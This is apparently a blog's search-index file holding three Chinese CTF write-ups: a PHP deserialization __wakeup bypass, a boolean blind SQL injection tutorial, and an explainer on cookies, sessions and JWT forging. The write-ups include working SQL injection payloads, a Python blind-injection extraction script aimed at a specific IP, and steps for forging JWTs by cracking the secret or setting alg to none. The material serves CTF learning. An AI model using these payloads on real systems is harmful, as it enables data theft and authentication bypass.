id="题目详解-1"><a href="#题目详解-1" class="headerlink" title="题目详解"></a>题目详解</h3><p>访问目标网址，根据***__wakeup()***魔术方法和题目名字，可以猜到这里是用到了php反序列化<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232842987-1714956926.png"><br>将代码copy并进行补全</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">xctf</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad requests'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">?</span>code<span class="token operator">=</span></code></pre><p>我们知道<em><strong>unserialize()<em><strong>会检查是否存在一个 <em><strong>__wakeup()</strong></em> 方法。如果存在，则会先调用 <em><strong>__wakeup()</strong></em> 方法，预先准备对象需要的资源。 所以我们需要绕过</strong></em>__wakeup()</strong></em><br>构造脚本：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">xctf</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad requests'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">xctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>运行得到O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}，于是利用***__wakeup()***的漏洞，将1改为2，并将其作为code的值传入即可得到flag。<br><img src="https://img2020.cnblogs.com/blog/1742044/202112/1742044-20211205232904634-1876216497.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-SQL注入联合查询 ctf-反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>布尔盲注基础知识</title>
      <link href="/2021/11/26/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/11/26/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="布尔盲注基础知识"><a href="#布尔盲注基础知识" class="headerlink" title="布尔盲注基础知识"></a>布尔盲注基础知识</h1><p>布尔盲注利用前提：页面没有显示位，没有输出SQL语句执行错误，只能通过页面返回正常不正常来判断是否存在注入。</p><h2 id="布尔盲注常用的一些函数及语句"><a href="#布尔盲注常用的一些函数及语句" class="headerlink" title="布尔盲注常用的一些函数及语句"></a>布尔盲注常用的一些函数及语句</h2><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><pre class=" language-SQL"><code class="language-SQL">substr(string, a, b)#a表示初始位置，b表示截取的个数，从1开始计数length(string)#返回string的长度ascii(s)#返回字符的ascii值count(column_name)#返回指定列的值的数目limit(a, b)#限制查询结果的返回数量，a为起始位置，从0开始，b为查询数量</code></pre><h3 id="相关语句"><a href="#相关语句" class="headerlink" title="相关语句"></a>相关语句</h3><pre class=" language-SQL"><code class="language-SQL">(select count(schema_name) from information_schema.schemata)>n</code></pre><p>该语句用于判断数据库的个数，个数大于n回显正常。</p><pre class=" language-SQL"><code class="language-SQL">(select length(schema_name) from information_schema.schemata limit a, b)>n</code></pre><p>该语句用于判断数据库名有多少字符，字符数大于n回显正常。</p><pre class=" language-SQL"><code class="language-SQL">(select ascii(substr(select schema_name from information_schema.schemata limit a, b), c, d))>n</code></pre><p>该语句用于判断数据库的字符是什么，该字符的ascii值大于n时回显正常。</p><pre class=" language-SQL"><code class="language-SQL">(length((select table_name from information_schema.tables where table_schema=database() limit a, b))=n)</code></pre><p>该语句用于判断该数据库下的表长，表长为n时回显正常。</p><pre class=" language-SQL"><code class="language-SQL">(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a, b), c, d))>n)</code></pre><p>该语句用于判断该数据库下的表名的字符是什么，字符对应的ascii值大于n时回显正常。</p><pre class=" language-SQL"><code class="language-SQL">(length((select column_name from information_schema.columns where table_name='fllag' and table_schema=database() limit a, b))=n)</code></pre><p>该语句用于判断该数据库下的表下的字段的长度，长度为n时回显正常。</p><pre class=" language-SQL"><code class="language-SQL">(ascii(substr((select column_name from information_schema.columns where table_name='fllag' and table_schema=database() limit a, b), c, d))>n)</code></pre><p>该语句用于判断该数据库下的表下的字段的字符是什么，字符对应的ascii值大于n时回显正常。</p><pre class=" language-SQL"><code class="language-SQL">(length((select fllllllag from flag.fllag limit a, b))=n)</code></pre><p>该语句用于判断该数据库下的表下的字段下的数据的长度，长度为n时回显正常。</p><pre class=" language-SQL"><code class="language-SQL">(ascii(substr((select fllllllag from flag.fllag  limit a, b), c, d))>n)</code></pre><p>该语句用于判断该数据库下的表下的字段的数据对应的字符是什么，字符对应的ascii值大于n时回显正常。</p><h2 id="一道简单例题"><a href="#一道简单例题" class="headerlink" title="一道简单例题"></a>一道简单例题</h2><p><img src="https://img2020.cnblogs.com/blog/1742044/202111/1742044-20211126233915199-379046895.png"><br>打开后进入一个登陆界面，尝试用万能密码绕过，弹出：<br><img src="https://img2020.cnblogs.com/blog/1742044/202111/1742044-20211126233950796-872524112.png"><br>得知这是正确的回显。<br>随便输入一个账号密码<br><img src="https://img2020.cnblogs.com/blog/1742044/202111/1742044-20211126234030404-1205003067.png"><br>得知这是错误的回显。<br>传值的方式为post，可以构建SQL语句。</p><h3 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h3><p>手动注入实在是太麻烦了，还伤眼睛，我手动注入了两小时还注入错了，但是这里还是写出来。</p><h4 id="猜库"><a href="#猜库" class="headerlink" title="猜库"></a>猜库</h4><h5 id="猜库的个数"><a href="#猜库的个数" class="headerlink" title="猜库的个数"></a>猜库的个数</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or (select count(schema_name) from information_schema.schemata)>n#</code></pre><p>发现当n=5时返回正常，n=6时返回错误<br>即有6个数据库</p><h5 id="猜库名的长度"><a href="#猜库名的长度" class="headerlink" title="猜库名的长度"></a>猜库名的长度</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or (select length(schema_name) from information_schema.schemata limit a, b)>n#</code></pre><h5 id="猜库名"><a href="#猜库名" class="headerlink" title="猜库名"></a>猜库名</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or (ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)), a, 1)))>n#</code></pre><p>猜测每一位的字母是什么<br>然后发现有一个flag库</p><h4 id="猜表"><a href="#猜表" class="headerlink" title="猜表"></a>猜表</h4><h5 id="猜表长"><a href="#猜表长" class="headerlink" title="猜表长"></a>猜表长</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or  (length((select table_name from information_schema.tables where table_schema=database() limit a, b))=n)#</code></pre><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or  (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a, b), c, d))>n)#</code></pre><p>猜测每一位的字母是什么<br>发现有fllag</p><h4 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h4><h5 id="猜字段长"><a href="#猜字段长" class="headerlink" title="猜字段长"></a>猜字段长</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or (length((select column_name from information_schema.columns where table_name='fllag' and table_schema=database() limit a, b))=n)#</code></pre><h5 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or (ascii(substr((select column_name from information_schema.columns where table_name='fllag' and table_schema=database() limit a, b), c, d))>n)#</code></pre><h4 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h4><h5 id="猜数据长"><a href="#猜数据长" class="headerlink" title="猜数据长"></a>猜数据长</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or (length((select fllllllag from flag.fllag limit a, b))=n)#</code></pre><h5 id="猜数据名"><a href="#猜数据名" class="headerlink" title="猜数据名"></a>猜数据名</h5><pre class=" language-1"><code class="language-1">post值uname=admin&pwd=' or (ascii(substr((select fllllllag from flag.fllag  limit a, b), c, d))>n)#</code></pre><p>即可获得flag。</p><h3 id="burpsuite半自动化注入"><a href="#burpsuite半自动化注入" class="headerlink" title="burpsuite半自动化注入"></a>burpsuite半自动化注入</h3><p>利用burpsuite抓包后可以利用intruder模块来进行爆破，将上文的payload附在请求头后，即可利用burpsuite的爆破功能来实现自动爆破，最后可根据返回的长度来确定爆破结果（还没有尝试）</p><h3 id="脚本盲注"><a href="#脚本盲注" class="headerlink" title="脚本盲注"></a>脚本盲注</h3><p>在经历了两小时的折磨之后，寻找了大佬SilentE寻求帮助，他介绍了一种神奇的东西叫做脚本，由于本人对python语法基本处于一窍不通的阶段，于是恬不知耻的要求与SilentE大佬进行了某些<img src="https://img2020.cnblogs.com/blog/1742044/202111/1742044-20211126234059632-2024193028.png">交易，下面放出大佬的脚本</p><pre class=" language-SQL"><code class="language-SQL">import requests#uname:adminFs = "wrong"Ts = "123456"url = "http://47.100.242.70:4339/index.php"def SQL_injection(url) :    res = ""    for i in range(1,2000) :        left = 32        right = 128        mid = (left + right) // 2        while (left < right) :            payload_database = "admin'^(ord(substr((select(database())),%d,1))>%d)^'1'='1" % (i, mid)            payload_all_database = "admin'^((ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1)))>%d)^'1'='1" % (i, mid)            payload_table = "admin'^((ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='babysql')),%d,1)))>%d)^'1'='1" % (i, mid)            payload_cloumn = "admin'^((ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='jeff')),%d,1)))>%d)^'1'='1" % (i, mid)            payload_info = "admin'^((ord(substr((select(group_concat(fllllllag))from(flag.fllag)),%d,1)))>%d)^'1'='1" % (i, mid)            payload = payload_cloumn            data = {"uname" : payload, "pwd" : "123456", "wp-submit" : "%E7%99%BB%E5%BD%95"}            #urls = url + payload            resp = requests.post(url = url, data = data)            if Ts in resp.text :                left = mid + 1            else :                right = mid            mid = (left + right) // 2        if (mid == 32) :            break        res += chr(mid)    print(res)if __name__ == "__main__" :    #data = {"uname" : "admin'^(ord(substr((select(database())),1,1))=60)^'1'='1", "pwd" : "12345678", "wp-submit" : "%E7%99%BB%E5%BD%95"}    #resp = requests.post(url = url, data = data)    #print(resp.text)    SQL_injection(url)</code></pre><p>其中的ord函数和ascii函数的本质是相同的。</p><p>参考：<br><a href="https://www.cnblogs.com/linuxsec/articles/11742311.html">https://www.cnblogs.com/linuxsec/articles/11742311.html</a><br>SilentE大佬的鼎力支持！</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-SQL ctf-布尔盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie， Session， token及JWT伪造</title>
      <link href="/2021/11/03/Cookie%EF%BC%8C%20Session%EF%BC%8C%20token%E5%8F%8AJWT%E4%BC%AA%E9%80%A0/"/>
      <url>/2021/11/03/Cookie%EF%BC%8C%20Session%EF%BC%8C%20token%E5%8F%8AJWT%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Cookie，-Session，-token及JWT伪造"><a href="#Cookie，-Session，-token及JWT伪造" class="headerlink" title="Cookie， Session， token及JWT伪造"></a>Cookie， Session， token及JWT伪造</h1><p>前言：HTTP是一种无状态的协议，而这就意味着如果用户向浏览器提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行。为了分辨链接是谁发起的，需要浏览器自己去解决这个问题。而<strong>Cookie</strong>、<strong>Session</strong>和<strong>Token</strong>就是为了解决这个问题而提出来的机制。</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><strong>Cookie</strong>是服务端发送给客户端的用于验证某一会话信息的数据，<strong>Cookie</strong>中有很多字段。不同网站<strong>Cookie</strong>中字段是不一样的，是由服务器端设置的。<strong>Cookie</strong>中常放入<strong>session id</strong>或者<strong>token</strong>用来验证会话的登录状态。</p><h3 id="Cookie的分类"><a href="#Cookie的分类" class="headerlink" title="Cookie的分类"></a>Cookie的分类</h3><h4 id="session-cookie"><a href="#session-cookie" class="headerlink" title="session cookie"></a>session cookie</h4><p>当我们打开一个浏览器访问某个网站的时候，该网站服务器会返回一个<strong>session cookie</strong>，当我们继续访问该网站下其他页面时，用该<strong>Cookie</strong>验证我们的身份。所以我们不需要每个页面都登录，但是我们关闭浏览器重新访问该网站时，需要重新登录获取浏览器返回的<strong>Cookie</strong>。<strong>session cookie</strong>在访问一个网站的过程中一般是不变化的，有时也会变化，比如切换不同的权限时<strong>Cookie</strong>值会变化。<br>浏览器生成<strong>session cookie</strong>的过程如下：<br>浏览器第一次发送请求（用户名和密码）给Web服务器，Web服务器把用户的登陆信息存在<strong>Cookie</strong>中发送给浏览器，浏览器再次访问该网站携带<strong>Cookie</strong>，直接访问。</p><h4 id="permennent-cookie"><a href="#permennent-cookie" class="headerlink" title="permennent cookie"></a>permennent cookie</h4><p>是保存在客户端浏览器上存储用户登录信息的数据，是由服务端生成发送给浏览器的。浏览器会将<strong>Cookie</strong>保存在某个目录下的文本文件中，下次请求同一网站时就发送该<strong>Cookie</strong>给服务器。前提是浏览器设置开启了<strong>Cookie</strong>。</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p><strong>session</strong>是保存在服务器端的经过加密的存储特定用户会话所需的属性及配置信息的数据。当我们打开浏览器访问某网站时，<strong>session</strong>建立，只要浏览器不关闭(也有时间限制，可以自己设置超时时间)，这个网站就可以记录用户的状态，当浏览器关闭时，<strong>session</strong>结束。<br><strong>SessionID</strong>除了可以保存在<strong>Cookie</strong>中外，还可以保存在<strong>URL</strong>中，作为请求的一个参数(sid)。其中，保存在<strong>Cookie</strong>中的<strong>SessionID</strong>与<strong>session cookie</strong>类似</p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><h3 id="Session的弊端"><a href="#Session的弊端" class="headerlink" title="Session的弊端"></a>Session的弊端</h3><p>上文提到<strong>Session</strong>的信息是保存在服务器端的，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，这时候<strong>Session</strong>的问题就会暴露出来：<br>1.每个用户经过应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言<strong>Session</strong>都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。<br>2.用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上，这样才能拿到授权的资源，比如说用两个机器组成一个集群，小明通过机器A登录系统，那么<strong>SessionID</strong>就会保存在机器A上，假设下一次请求被转发到机器B怎么办？机器B没有小明的<strong>SessionID</strong>。有时候会采用<strong>session sticky</strong>的小技巧，就是让小明的请求一直粘连在机器A上。但是这也不管用，要是机器A挂掉了，还得转到机器B上去。这样的话就只好做<strong>SessionID</strong>的复制了，即把A机器上的<strong>SessionID</strong>复制到B机器上。后来<strong>memcached</strong>提出把<strong>SessionID</strong>集中存储在一个地方，所有机器都通过这个地方来访问。但是这样一来，一旦负责<strong>Session</strong>的机器挂掉，所有人就得重新登录一遍，这种问题也是不愿意发生的。<br>3.CSRF攻击: 因为<strong>Session</strong>是基于<strong>Cookie</strong>来进行用户识别的，如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p><h3 id="token的建立"><a href="#token的建立" class="headerlink" title="token的建立"></a>token的建立</h3><p>基于以上的问题有人提出了摆脱<strong>Session</strong>的想法。具体就是不在服务端保存<strong>SessionID</strong>了，让客户端去保存一个服务端生成的<strong>token</strong>，每次请求的时候附加上这个<strong>token</strong>，服务端只需要对这个<strong>token</strong>进行相应的校验就可以完成身份的验证了。<br>由于服务端不再存放<strong>SessionID</strong>了，也不会有<strong>token</strong>，那么可能就会有攻击者伪造<strong>token</strong>来攻击。因此服务端需要对<strong>token</strong>做一些防伪造的的处理，具体就是对数据做一个签名。譬如用<strong>HMAC-SHA256算法</strong>加上一个只有服务器知道的密钥，对数据做一个签名，然后把签名和数据一起作为<strong>token</strong>，由于密钥别人不知道，就无法伪造<strong>token</strong>了。服务器并不会保存这个<strong>token</strong>，当再次将<strong>token</strong>发到服务器的时候，服务端会用同样的<strong>HMAC-SHA256算法</strong>和同样的密钥去对数据再计算一次签名，并和<strong>token</strong>中的签名做一个比较，如果相同的话，就可以判断出已经登陆过，并且可以直接取到<strong>userId</strong>；如果不相同，则数据部分肯定被人篡改过，这时就能够做一些身份校验失败的相应处理。<br>这样一来，服务器就不需要保存<strong>SessionID</strong>了，只需要生成<strong>token</strong>，然后校验<strong>token</strong>，相当于用CPU计算时间换回了存储空间。</p><h3 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h3><p>基于<strong>token</strong>的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于<strong>token</strong>认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。<br>流程上是这样的：<br>1.用户使用用户名密码来请求服务器<br>2.服务器进行验证用户的信息<br>3.服务器通过验证发送给用户一个<strong>token</strong><br>4.客户端存储<strong>token</strong>，并在每次请求时附送上这个<strong>token</strong>值<br>5.服务端验证<strong>token</strong>值，并返回数据<br>这个<strong>token</strong>必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持<strong>CORS(跨来源资源共享)策略</strong>，一般我们在服务端这么做就可以了。</p><h2 id="JWT的构成"><a href="#JWT的构成" class="headerlink" title="JWT的构成"></a>JWT的构成</h2><p><strong>JWT</strong>是由三段信息构成的，将这三段信息文本用**.<strong>连接在一起就构成了</strong>JWT**字符串，譬如：</p><pre class=" language-1"><code class="language-1">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SP0R2USEDHqPV7mcIK08ZAs4WtPMQ0NdMHuSD8tnWOw</code></pre><h3 id="头部（header）"><a href="#头部（header）" class="headerlink" title="头部（header）"></a>头部（header）</h3><p>JWT的头部承载两部分信息：<br>1.声明类型：这里是JWT<br>2.声明加密算法：通常使用<strong>HMAC SHA256</strong><br>譬如上文第一部分的头部即为：</p><pre class=" language-1"><code class="language-1">{  "alg": "HS256",  "typ": "JWT"}</code></pre><p>的base64加密后的字符串。<br>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问。</p><h3 id="载荷（payload）"><a href="#载荷（payload）" class="headerlink" title="载荷（payload）"></a>载荷（payload）</h3><p>存放有效信息，包含标准中注册的声明、公共的声明、私有的声明</p><h4 id="标准中注册的声明-不强制使用"><a href="#标准中注册的声明-不强制使用" class="headerlink" title="标准中注册的声明 (不强制使用)"></a>标准中注册的声明 (不强制使用)</h4><pre class=" language-1"><code class="language-1">iss: jwt签发者sub: jwt所面向的用户aud: 接收jwt的一方exp: jwt的过期时间，这个过期时间必须要大于签发时间nbf: 定义在什么时间之前，该jwt都是不可用的.iat: jwt的签发时间jti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。</code></pre><h4 id="公共的声明"><a href="#公共的声明" class="headerlink" title="公共的声明"></a>公共的声明</h4><p>可添加任何信息，一般添加用户的相关信息或必要的信息，不建议添加敏感信息。</p><h4 id="私有的声明"><a href="#私有的声明" class="headerlink" title="私有的声明"></a>私有的声明</h4><p>私有声明是提供者和消费者共同定义的声明，不建议存放敏感信息。<br>譬如上文第二部分的载荷即为：</p><pre class=" language-1"><code class="language-1">{  "sub": "1234567890",  "name": "John Doe",  "iat": 1516239022}</code></pre><p>的base64加密后的字符串。</p><h3 id="签证（signature）"><a href="#签证（signature）" class="headerlink" title="签证（signature）"></a>签证（signature）</h3><p><strong>JWT</strong>第三部分是一个签证信息，由三部分组成：<strong>header</strong> (base64加密后的)、<strong>payload</strong> (base64加密后的)、<strong>secret</strong>。<br>这个部分需要base64加密后的<strong>header</strong>和base64加密后的<strong>payload</strong>使用.连接组成的字符串，然后通过<strong>header</strong>中声明的加密方式进行加盐<strong>secret</strong>组合加密，然后就构成<strong>JWT</strong>的第三部分。<br>譬如上文第三部分的签证即为：</p><pre class=" language-1"><code class="language-1">HMACSHA256(  base64UrlEncode(header) + "." +  base64UrlEncode(payload),  your-256-bit-secret（我这里使用的是1234）)</code></pre><p>加盐<strong>secret</strong>组合加密后的字符串。<br><em><strong>注意</strong></em>：<strong>secret</strong>是保存在服务器端的，<strong>JWT</strong>的签发生成也是在服务器端的，<strong>secret</strong>就是用来进行<strong>JWT</strong>的签发和<strong>JWT</strong>的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个<strong>secret</strong>，那就意味着客户端是可以自我签发<strong>JWT</strong>了。</p><h2 id="通过JWT进行认证"><a href="#通过JWT进行认证" class="headerlink" title="通过JWT进行认证"></a>通过JWT进行认证</h2><h3 id="JWT的认证"><a href="#JWT的认证" class="headerlink" title="JWT的认证"></a>JWT的认证</h3><p>客户端接收服务器返回的<strong>JWT</strong>，将其存储在<strong>Cookie</strong>或<strong>localStorage</strong>中。此后，客户端将在与服务器交互中都会带<strong>JWT</strong>。如果将它存储在<strong>Cookie</strong>中，就可以自动发送，但是不会跨域，因此一般是将它放入HTTP请求的<strong>Header Authorization</strong>字段中。当跨域时，也可以将JWT被放置于POST请求的数据主体中。<br>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。<br><img src="https://img-blog.csdnimg.cn/20200512130216836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="https://img-blog.csdnimg.cn/20200512130216836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70"><br>JWT本身包含认证信息，因此一旦信息泄露，任何人都可以获得令牌的所有权限。为了减少盗用，JWT的有效期不宜设置太长。对于某些重要操作，用户在使用时应该每次都进行进行身份验证。为了减少盗用和窃取，JWT不建议使用HTTP协议来传输代码，而是使用加密的HTTPS协议进行传输。</p><h3 id="JWT安全问题"><a href="#JWT安全问题" class="headerlink" title="JWT安全问题"></a>JWT安全问题</h3><p>1.修改算法为none<br>2.修改算法从RS256到HS256<br>3.信息泄漏 密钥泄漏<br>4.爆破密钥</p><h2 id="JWT伪造"><a href="#JWT伪造" class="headerlink" title="JWT伪造"></a>JWT伪造</h2><p>第一步：将web服务器返回的JWT数据进行翻译，我这里使用的是这个<a href="https://jwt.io/">https://jwt.io/</a> 在线工具（也可以用base64去解码），找到要伪造的内容。<br>第二步：使用工具爆破秘钥<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a> 该程序需要在Linux环境下运行。</p><h3 id="工具的安装及使用"><a href="#工具的安装及使用" class="headerlink" title="工具的安装及使用"></a>工具的安装及使用</h3><p>终端进入到虚拟机下该文件目录中，输入docker build . -t jwtcrack即可进行build，如果报错的话，证明你的权限不够，需要将用户添加到docker用户组，输入：</p><pre class=" language-linux"><code class="language-linux">sudo groupadd dockersudo gpasswd -a $USER dockernewgrp docker</code></pre><p>后重启即可。<br>build结束后就可以运行了</p><pre class=" language-linux"><code class="language-linux">docker run -it --rm jwtcrack +JWT</code></pre><p>等待输出secret即可。<br>第三步：在<a href="https://jwt.io/">https://jwt.io/</a> 在线工具中输入爆破出来的秘钥进行验证，如果第三部分的内容与之前一致，证明秘钥正确，就可以进行修改了，修改后再粘贴生成的<strong>JWT</strong>利用burpsuite抓包进行修改后发回到服务器中即可实现JWT伪造。</p><p>参考：<br><a href="https://blog.csdn.net/qq_45521281/article/details/106073624">https://blog.csdn.net/qq_45521281/article/details/106073624</a><br><a href="https://blog.csdn.net/whoim_i/article/details/104279181/">https://blog.csdn.net/whoim_i/article/details/104279181/</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
